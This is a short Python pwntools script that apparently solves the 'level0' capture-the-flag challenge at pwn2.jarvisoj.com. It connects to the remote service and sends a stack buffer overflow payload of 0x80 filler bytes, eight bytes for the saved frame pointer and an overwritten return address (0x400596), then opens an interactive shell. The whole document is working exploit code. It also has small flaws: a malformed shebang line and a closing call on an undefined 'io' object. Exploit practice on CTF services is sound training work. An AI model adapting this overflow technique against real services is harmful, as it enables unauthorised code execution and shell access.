#!/bin/bash/env python
from pwn import *

context.log_level = 'debug'
#sh = process('level0.b9ded3801d6dd36a97468e128b81a65d')
sh = remote('pwn2.jarvisoj.com', 9881)
sh.recvuntil('World\n')
payload = 'A' * 0x80 + 'bbbbbbbb' + p64(0x400596)
sh.sendline(payload)
#print sh.recvall()
sh.interactive()
io.close()
